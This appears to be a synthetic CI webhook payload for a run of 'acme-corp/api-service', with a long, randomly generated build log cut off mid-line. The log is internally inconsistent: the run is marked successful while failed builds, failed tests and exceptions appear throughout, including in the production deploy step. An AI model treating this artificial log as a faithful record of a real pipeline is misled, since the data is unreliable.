{
  "action": "completed",
  "workflow_run": {
    "id": 735,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "22cd9f0a3670a66741fbe921a167565226155d14",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-20T12:00:32.569574Z",
    "updated_at": "2025-12-20T12:02:20.816590Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: save_cache ===\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-5710\nInstalling lodash@4.17.0\nCache hit for key-7044\n[12:00:32] WARN: Deprecated API usage\n  PASS: test_db_connect (173ms)\n  PASS: test_cache_hit (223ms)\nCompiling src/index.js...\nCompiling src/index.js...\nCache hit for key-8053\n[12:00:32] INFO: Processing request\n\u2713 build completed\nInstalling express@2.9.0\n[12:00:32] INFO: Processing request\n\u2713 build completed\n  PASS: test_auth_login (347ms)\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-8616\nCompiling src/index.js...\n[12:00:32] INFO: Processing request\n  PASS: test_db_connect (80ms)\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nInstalling prettier@5.3.0\nArtifact uploaded: build.tar.gz (10MB)\nCompiling src/index.js...\n  PASS: test_api_health (126ms)\n  PASS: test_auth_login (122ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/handler.rs...\n[12:00:32] INFO: Processing request\nCompiling src/app.ts...\n[12:00:32] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 2/10: Building\nStep 10/10: Building\nInstalling express@4.20.0\nInstalling prettier@1.2.0\n\u2713 build completed\nCompiling src/handler.rs...\n\u2713 lint completed\nWARNING: eslint has known vulnerabilities\nStep 10/10: Building\n[12:00:32] WARN: Deprecated API usage\n\u2713 test completed\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nWARNING: webpack has known vulnerabilities\nCompiling src/service.java...\nInstalling webpack@5.2.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nFAILED: test_user_create\n  PASS: test_auth_login (473ms)\n\u2717 build failed with exit code 89\nStep 7/10: Building\n[12:00:32] INFO: Processing request\nCompiling src/app.ts...\nInstalling webpack@5.3.0\nCompiling src/utils.go...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 test completed\nCache hit for key-9249\nInstalling express@5.18.0\nWARNING: react has known vulnerabilities\n\u2713 lint completed\n[12:00:32] WARN: Deprecated API usage\n[12:00:32] WARN: Deprecated API usage\n[12:00:32] INFO: Processing request\nWARNING: eslint has known vulnerabilities\n\u2713 test completed\n\u2717 build failed with exit code 13\nCache hit for key-4223\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/app.ts...\nCompiling src/main.py...\nStep 3/10: Building\n\u2713 test completed\nStep 1/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\n  PASS: test_cache_hit (342ms)\nInstalling prettier@5.7.0\nCache hit for key-4854\nArtifact uploaded: build.tar.gz (29MB)\nStep 9/10: Building\nStep 10/10: Building\n[12:00:32] INFO: Processing request\nCache hit for key-9809\n[12:00:32] INFO: Processing request\nInstalling webpack@5.6.0\n[12:00:32] WARN: Deprecated API usage\n  PASS: test_db_connect (261ms)\n[12:00:32] INFO: Processing request\nException: NullPointerException\nCompiling src/handler.rs...\nCache hit for key-4259\nStep 3/10: Building\nStep 1/10: Building\nInstalling eslint@1.15.0\nException: ValueError\nStep 8/10: Building\nInstalling lodash@5.9.0\nInstalling jest@2.9.0\nCompiling src/utils.go...\nInstalling axios@3.5.0\nStep 8/10: Building\nCache hit for key-8457\nCache hit for key-2612\nCompiling src/index.js...\nCompiling src/handler.rs...\nException: ValueError\n  PASS: test_api_health (305ms)\n\u2713 lint completed\nStep 9/10: Building\nWARNING: eslint has known vulnerabilities\n\u2713 lint completed\n[12:00:32] WARN: Deprecated API usage\n[12:00:32] INFO: Processing request\n\u2713 test completed\n[12:00:32] INFO: Processing request\nStep 8/10: Building\n[12:00:32] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\nStep 6/10: Building\nInstalling eslint@5.20.0\n  PASS: test_cache_hit (375ms)\nCache hit for key-2692\nException: ValueError\n  PASS: test_api_health (388ms)\nCompiling src/app.ts...\n  PASS: test_api_health (407ms)\nStep 4/10: Building\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (39MB)\n  PASS: test_user_create (27ms)\nArtifact uploaded: build.tar.gz (47MB)\nStep 9/10: Building\nInstalling lodash@4.15.0\n\u2713 build completed\nWARNING: jest has known vulnerabilities\nCache hit for key-6530\n\u2713 lint completed\n[12:00:32] INFO: Processing request\n\u2713 test completed\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCache hit for key-8225\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:32] INFO: Processing request\nInstalling axios@3.7.0\nArtifact uploaded: build.tar.gz (2MB)\nStep 8/10: Building\n  PASS: test_cache_hit (148ms)\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:32] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (14MB)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_cache_hit (261ms)\nCache hit for key-5510\nWARNING: react has known vulnerabilities\nInstalling prettier@1.14.0\nStep 1/10: Building\nStep 10/10: Building\n[12:00:32] INFO: Processing request\nCache hit for key-1479\nCache hit for key-2453\n\u2713 test completed\nStep 10/10: Building\nStep 8/10: Building\nStep 2/10: Building\n  PASS: test_auth_login (245ms)\nCache hit for key-4732\nCompiling src/app.ts...\n\u2713 lint completed\nInstalling eslint@5.3.0\nInstalling react@3.7.0\n  PASS: test_user_create (57ms)\nCompiling src/index.js...\nCache hit for key-2579\n[12:00:32] INFO: Processing request\nCache hit for key-6187\n  PASS: test_user_create (152ms)\n  PASS: test_api_health (44ms)\nStep 7/10: Building\n  PASS: test_auth_login (204ms)\nInstalling axios@5.16.0\n  PASS: test_auth_login (490ms)\n[12:00:32] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (24MB)\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling eslint@5.13.0\nWARNING: eslint has known vulnerabilities\n=== Step save_cache completed ===\n=== Step: install_dependencies ===\nCache hit for key-2323\n\u2713 lint completed\nCompiling src/main.py...\nCache hit for key-7878\n  PASS: test_db_connect (32ms)\n[12:00:32] INFO: Processing request\nCompiling src/app.ts...\nStep 4/10: Building\n  PASS: test_db_connect (152ms)\nCache hit for key-7620\nCache hit for key-4545\n[12:00:32] INFO: Processing request\nInstalling axios@4.6.0\nCache hit for key-9422\nStep 5/10: Building\nCompiling src/app.ts...\n  PASS: test_api_health (219ms)\n[12:00:32] INFO: Processing request\nStep 2/10: Building\nStep 5/10: Building\nInstalling express@1.8.0\nCompiling src/service.java...\nWARNING: webpack has known vulnerabilities\nStep 1/10: Building\nWARNING: jest has known vulnerabilities\n\u2713 lint completed\nInstalling react@1.15.0\nCompiling src/app.ts...\nInstalling webpack@1.10.0\n  PASS: test_db_connect (305ms)\n[12:00:32] INFO: Processing request\n\u2713 lint completed\nStep 1/10: Building\n  PASS: test_db_connect (110ms)\n  PASS: test_cache_hit (325ms)\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/index.js...\nCompiling src/service.java...\nCache hit for key-7113\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (15MB)\nWARNING: react has known vulnerabilities\nInstalling jest@1.8.0\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:32] INFO: Processing request\nInstalling lodash@4.10.0\nInstalling express@4.16.0\nStep 10/10: Building\nInstalling express@4.0.0\n  PASS: test_cache_hit (275ms)\n\u2713 test completed\n  PASS: test_api_health (371ms)\n\u2713 lint completed\nInstalling axios@4.13.0\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nStep 6/10: Building\n\u2713 lint completed\n[12:00:32] INFO: Processing request\nStep 7/10: Building\nInstalling eslint@3.2.0\nCache hit for key-6515\n  PASS: test_user_create (191ms)\nArtifact uploaded: build.tar.gz (40MB)\nInstalling lodash@2.5.0\nCompiling src/utils.go...\n\u2713 test completed\n[12:00:32] INFO: Processing request\nInstalling prettier@1.0.0\n[12:00:32] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (20MB)\nStep 1/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/main.py...\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 build completed\nCompiling src/utils.go...\n[12:00:32] WARN: Deprecated API usage\nCompiling src/handler.rs...\n[12:00:32] ERROR: Connection failed\nCache hit for key-2908\n[12:00:32] INFO: Processing request\n  PASS: test_api_health (324ms)\n[12:00:32] ERROR: Connection failed\nStep 9/10: Building\nCache hit for key-4270\n  PASS: test_auth_login (20ms)\nArtifact uploaded: build.tar.gz (10MB)\nCompiling src/handler.rs...\n\u2713 lint completed\n  PASS: test_api_health (82ms)\nInstalling express@3.14.0\n\u2713 build completed\nCache hit for key-2663\nInstalling express@2.17.0\nFAILED: test_api_health\nInstalling react@2.7.0\nInstalling axios@2.10.0\nCache hit for key-5002\n\u2713 test completed\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_api_health (141ms)\nInstalling jest@3.20.0\nCache hit for key-6217\nStep 10/10: Building\nCache hit for key-6146\nCache hit for key-7831\n[12:00:32] INFO: Processing request\nStep 9/10: Building\nCompiling src/utils.go...\nCache hit for key-3590\nInstalling express@1.9.0\n[12:00:32] WARN: Deprecated API usage\nInstalling webpack@2.2.0\nStep 2/10: Building\nStep 5/10: Building\n[12:00:32] WARN: Deprecated API usage\nStep 2/10: Building\n\u2713 lint completed\n  PASS: test_user_create (325ms)\nInstalling eslint@4.7.0\n[12:00:32] INFO: Processing request\nCompiling src/main.py...\n\u2713 test completed\n[12:00:32] INFO: Processing request\n  PASS: test_cache_hit (304ms)\nArtifact uploaded: build.tar.gz (31MB)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/handler.rs...\nStep 5/10: Building\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-4582\n  PASS: test_api_health (303ms)\n[12:00:32] INFO: Processing request\n\u2713 build completed\nStep 2/10: Building\nStep 8/10: Building\nCache hit for key-5562\nCache hit for key-4061\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_db_connect (19ms)\nCache hit for key-1425\nCompiling src/main.py...\nCache hit for key-9873\n[12:00:32] WARN: Deprecated API usage\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 lint completed\n  PASS: test_cache_hit (400ms)\nArtifact uploaded: build.tar.gz (3MB)\n  PASS: test_user_create (356ms)\nCache hit for key-8871\n  PASS: test_api_health (303ms)\n[12:00:32] INFO: Processing request\nStep 9/10: Building\nCache hit for key-5554\nStep 5/10: Building\nStep 6/10: Building\n  PASS: test_auth_login (114ms)\n  PASS: test_auth_login (171ms)\n\u2713 build completed\nInstalling prettier@4.3.0\nStep 10/10: Building\nCompiling src/index.js...\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_auth_login (389ms)\nCompiling src/service.java...\n  PASS: test_auth_login (383ms)\nException: ValueError\n\u2713 lint completed\nInstalling eslint@3.18.0\nCompiling src/service.java...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (24MB)\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_user_create (341ms)\n  PASS: test_db_connect (202ms)\n[12:00:32] WARN: Deprecated API usage\nStep 8/10: Building\nInstalling jest@2.19.0\n\u2713 test completed\nException: TypeError\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCache hit for key-3995\n  PASS: test_db_connect (229ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-3383\n[12:00:32] INFO: Processing request\nInstalling express@2.16.0\nArtifact uploaded: build.tar.gz (35MB)\nStep 10/10: Building\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCompiling src/index.js...\nInstalling prettier@5.18.0\n  PASS: test_cache_hit (181ms)\nCache hit for key-7129\nCache hit for key-7653\nInstalling react@1.16.0\n  PASS: test_db_connect (142ms)\n=== Step install_dependencies completed ===\n=== Step: unit_tests ===\nStep 3/10: Building\nCache hit for key-7364\n  PASS: test_db_connect (479ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\n[12:00:32] INFO: Processing request\n\u2713 test completed\n[12:00:32] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-8216\nArtifact uploaded: build.tar.gz (8MB)\nInstalling react@5.9.0\n\u2713 test completed\n\u2713 test completed\nCompiling src/main.py...\nStep 2/10: Building\n  PASS: test_user_create (161ms)\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (34MB)\nWARNING: prettier has known vulnerabilities\nException: RuntimeError\nCompiling src/index.js...\nCache hit for key-4580\nCompiling src/main.py...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (4MB)\nInstalling express@5.8.0\nStep 5/10: Building\n  PASS: test_db_connect (363ms)\n[12:00:32] INFO: Processing request\nCompiling src/main.py...\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 lint completed\nInstalling webpack@3.18.0\nCache hit for key-2975\n  PASS: test_user_create (402ms)\nCache hit for key-8709\nInstalling webpack@1.5.0\nCache hit for key-1151\nInstalling lodash@5.6.0\n[12:00:32] WARN: Deprecated API usage\nCompiling src/service.java...\n  PASS: test_api_health (73ms)\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\nInstalling webpack@1.0.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (24MB)\n  PASS: test_user_create (32ms)\n[12:00:32] INFO: Processing request\n\u2713 test completed\nCache hit for key-9368\n  PASS: test_auth_login (451ms)\n  PASS: test_api_health (76ms)\n\u2713 build completed\n  PASS: test_auth_login (52ms)\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/handler.rs...\n  PASS: test_cache_hit (357ms)\n\u2713 build completed\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:32] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-3441\n[12:00:32] INFO: Processing request\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (49MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 build completed\nStep 10/10: Building\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-8127\nCache hit for key-3498\nCache hit for key-1951\nCompiling src/utils.go...\n\u2713 lint completed\nCompiling src/handler.rs...\nCompiling src/main.py...\nCache hit for key-8798\n\u2713 lint completed\nInstalling jest@5.18.0\n  PASS: test_user_create (393ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (48MB)\nCompiling src/app.ts...\nCompiling src/main.py...\nInstalling react@4.4.0\nCache hit for key-2397\n  PASS: test_user_create (28ms)\nCache hit for key-8238\n[12:00:32] INFO: Processing request\n  PASS: test_auth_login (433ms)\nStep 7/10: Building\nCompiling src/main.py...\nWARNING: jest has known vulnerabilities\nCache hit for key-7299\n[12:00:32] INFO: Processing request\n\u2713 test completed\nCache hit for key-7117\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-8591\n  PASS: test_db_connect (344ms)\n[12:00:32] INFO: Processing request\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (12MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 1/10: Building\n\u2713 lint completed\nWARNING: jest has known vulnerabilities\nCompiling src/handler.rs...\nCompiling src/main.py...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/main.py...\nCompiling src/service.java...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (2MB)\nStep 9/10: Building\n\u2713 lint completed\nStep 8/10: Building\nInstalling axios@4.11.0\nWARNING: prettier has known vulnerabilities\n  PASS: test_cache_hit (8ms)\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/service.java...\n[12:00:32] INFO: Processing request\nCache hit for key-8403\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 test completed\n\u2713 test completed\n\u2713 build completed\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-9420\nStep 9/10: Building\n  PASS: test_auth_login (302ms)\n[12:00:32] INFO: Processing request\n\u2713 build completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_db_connect (410ms)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nStep 10/10: Building\nCache hit for key-5553\n[12:00:32] WARN: Deprecated API usage\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:32] INFO: Processing request\nInstalling jest@4.3.0\nArtifact uploaded: build.tar.gz (32MB)\n\u2713 test completed\nWARNING: jest has known vulnerabilities\nCache hit for key-6950\n[12:00:32] INFO: Processing request\n  PASS: test_api_health (4ms)\n\u2713 test completed\nInstalling jest@2.3.0\n\u2713 lint completed\nStep 10/10: Building\n\u2713 lint completed\nStep 2/10: Building\n[12:00:32] INFO: Processing request\n  PASS: test_user_create (228ms)\nCompiling src/index.js...\n[12:00:32] WARN: Deprecated API usage\n[12:00:32] INFO: Processing request\nInstalling express@4.13.0\n[12:00:32] INFO: Processing request\nCompiling src/service.java...\nFAILED: test_db_connect\nCompiling src/service.java...\nCompiling src/app.ts...\nInstalling jest@2.14.0\nCompiling src/main.py...\nFAILED: test_db_connect\nStep 3/10: Building\nInstalling axios@1.0.0\nCache hit for key-9673\n\u2713 test completed\nCompiling src/app.ts...\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\n\u2713 build completed\n  PASS: test_user_create (492ms)\nStep 8/10: Building\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nStep 6/10: Building\nStep 3/10: Building\n  PASS: test_user_create (183ms)\n  PASS: test_auth_login (406ms)\nInstalling express@4.20.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/service.java...\n[12:00:32] INFO: Processing request\n  PASS: test_user_create (239ms)\nCompiling src/handler.rs...\n=== Step unit_tests completed ===\n=== Step: deploy_production ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-8028\n  PASS: test_auth_login (379ms)\nCompiling src/app.ts...\nInstalling jest@2.18.0\nInstalling react@4.9.0\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (3MB)\nCache hit for key-4754\n[12:00:32] INFO: Processing request\nStep 9/10: Building\nInstalling webpack@1.9.0\nCache hit for key-7420\n[12:00:32] INFO: Processing request\n\u2713 lint completed\n\u2717 build failed with exit code 63\nInstalling axios@2.9.0\n\u2713 lint completed\nCache hit for key-4908\n[12:00:32] ERROR: Connection failed\nCompiling src/app.ts...\nStep 3/10: Building\nStep 2/10: Building\n  PASS: test_auth_login (426ms)\nCache hit for key-6553\nCompiling src/service.java...\n\u2713 test completed\nInstalling express@1.10.0\n[12:00:32] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:32] INFO: Processing request\nCache hit for key-7617\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_cache_hit (203ms)\nStep 10/10: Building\nCompiling src/handler.rs...\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 build completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/service.java...\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCache hit for key-2793\nCache hit for key-7383\nCompiling src/handler.rs...\nInstalling eslint@1.3.0\n\u2717 build failed with exit code 103\nFAILED: test_db_connect\nCache hit for key-7121\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (21MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-9897\nInstalling react@3.11.0\n[12:00:32] WARN: Deprecated API usage\n\u2713 lint completed\n  PASS: test_auth_login (144ms)\n[12:00:32] INFO: Processing request\nCompiling src/main.py...\nCompiling src/service.java...\n[12:00:32] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (23MB)\nStep 1/10: Building\nInstalling webpack@2.14.0\n  PASS: test_api_health (230ms)\n  PASS: test_api_health (209ms)\n\u2713 test completed\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_db_connect (23ms)\nCache hit for key-8200\nCache hit for key-5031\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (33MB)\n  PASS: test_api_health (135ms)\n\u2713 test completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (2MB)\n\u2713 build completed\nInstalling react@1.11.0\n[12:00:32] WARN: Deprecated API usage\n\u2713 build completed\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (21MB)\nStep 4/10: Building\nCompiling src/app.ts...\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (14MB)\nCompiling src/service.java...\nCompiling src/handler.rs...\nCache hit for key-2780\nArtifact uploaded: build.tar.gz (21MB)\nInstalling react@3.9.0\nWARNING: react has known vulnerabilities\nStep 1/10: Building\n[12:00:32] WARN: Deprecated API usage\nStep 3/10: Building\n  PASS: test_cache_hit (126ms)\nInstalling axios@2.18.0\nCompiling src/handler.rs...\n[12:00:32] ERROR: Connection failed\nInstalling jest@5.8.0\n  PASS: test_db_connect (352ms)\nStep 10/10: Building\nInstalling lodash@2.7.0\nCompiling src/index.js...\n[12:00:32] INFO: Processing request\nInstalling webpack@2.9.0\nCompiling src/index.js...\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nFAILED: test_api_health\nCompiling src/index.js...\nStep 7/10: Building\n[12:00:32] INFO: Processing request\nCache hit for key-7215\nArtifact uploaded: build.tar.gz (24MB)\nStep 7/10: Building\nCompiling src/index.js...\nInstalling eslint@3.8.0\n\u2713 lint completed\nStep 8/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_api_health (346ms)\nInstalling express@3.7.0\n\u2713 test completed\nCompiling src/handler.rs...\nCache hit for key-2816\n[12:00:32] INFO: Processing request\n  PASS: test_api_health (476ms)\n[12:00:32] WARN: Deprecated API usage\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-3652\nCache hit for key-2967\nInstalling jest@3.17.0\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:32] INFO: Processing request\nInstalling express@3.5.0\nCache hit for key-8077\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_auth_login (390ms)\nStep 10/10: Building\n  PASS: test_api_health (451ms)\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_cache_hit (406ms)\n[12:00:32] INFO: Processing request\nInstalling webpack@3.8.0\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-8650\nStep 9/10: Building\nCompiling src/utils.go...\nInstalling axios@1.10.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (47MB)\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-4335\nStep 7/10: Building\n[12:00:32] INFO: Processing request\n  PASS: test_db_connect (138ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (494ms)\n\u2713 test completed\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nStep 10/10: Building\nException: TypeError\n  PASS: test_auth_login (405ms)\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nInstalling jest@1.3.0\n  PASS: test_user_create (46ms)\n  PASS: test_db_connect (337ms)\n[12:00:32] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (36MB)\nInstalling express@2.16.0\nCache hit for key-4513\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 test completed\n  PASS: test_db_connect (120ms)\n\u2713 build completed\n  PASS: test_api_health (389ms)\n[12:00:32] INFO: Processing request\n\u2713 build completed\n\u2713 build completed\nCompiling src/service.java...\nInstalling webpack@2.4.0\nArtifact uploaded: build.tar.gz (5MB)\nStep 6/10: Building\nCache hit for key-2801\nArtifact uploaded: build.tar.gz (37MB)\nArtifact uploaded: build.tar.gz (6MB)\n=== Step deploy_production completed ===\n=== Step: type_check ===\nCompiling src/service.java...\n[12:00:32] ERROR: Connection failed\nStep 2/10: Building\n[12:00:32] WARN: Deprecated API usage\n  PASS: test_db_connect (298ms)\nStep 7/10: Building\nInstalling lodash@2.6.0\nCompiling src/handler.rs...\n\u2713 build completed\nWARNING: lodash has known vulnerabilities\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCompiling src/app.ts...\n[12:00:32] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (25MB)\nInstalling jest@5.0.0\n\u2713 lint completed\n\u2713 lint completed\nInstalling prettier@3.18.0\nInstalling jest@4.1.0\nCache hit for key-4064\n\u2713 build completed\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (27MB)\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (33MB)\n  PASS: test_db_connect (284ms)\nCompiling src/handler.rs...\nStep 8/10: Building\n  PASS: test_api_health (462ms)\n  PASS: test_api_health (440ms)\n\u2713 build completed\nStep 5/10: Building\n  PASS: test_api_health (298ms)\n[12:00:32] INFO: Processing request\nInstalling webpack@3.12.0\nCompiling src/service.java...\n[12:00:32] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 build completed\nStep 6/10: Building\n  PASS: test_auth_login (332ms)\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 test completed\nInstalling axios@1.17.0\n  PASS: test_api_health (259ms)\n  PASS: test_cache_hit (65ms)\n[12:00:32] INFO: Processing request\n  PASS: test_cache_hit (292ms)\nInstalling express@5.4.0\nCache hit for key-2389\nCompiling src/main.py...\nCache hit for key-4278\nCompiling src/service.java...\nCompiling src/service.java...\nCompiling src/index.js...\n\u2713 build completed\nCache hit for key-3829\nArtifact uploaded: build.tar.gz (35MB)\nStep 10/10: Building\nStep 6/10: Building\n  PASS: test_auth_login (160ms)\n\u2713 build completed\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (5MB)\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling lodash@1.7.0\n  PASS: test_api_health (397ms)\n  PASS: test_cache_hit (322ms)\nCache hit for key-1773\nException: TypeError\n[12:00:32] INFO: Processing request\n  PASS: test_cache_hit (455ms)\nInstalling webpack@1.0.0\n  PASS: test_user_create (475ms)\n[12:00:32] INFO: Processing request\nCache hit for key-8344\nCompiling src/main.py...\nCache hit for key-7663\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 test completed\n\u2713 build completed\nInstalling react@1.19.0\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:32] WARN: Deprecated API usage\nCompiling src/utils.go...\nInstalling jest@1.7.0\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:32] INFO: Processing request\nInstalling jest@1.19.0\nCache hit for key-7821\n  PASS: test_auth_login (215ms)\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_db_connect (441ms)\nInstalling webpack@2.16.0\nInstalling webpack@4.8.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (11MB)\nException: ValueError\nInstalling axios@2.17.0\nCache hit for key-3559\nInstalling express@3.5.0\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-9443\n  PASS: test_api_health (260ms)\nStep 6/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (5MB)\n\u2717 build failed with exit code 51\n\u2713 lint completed\n\u2713 test completed\n[12:00:32] INFO: Processing request\n  PASS: test_user_create (421ms)\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-2490\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for 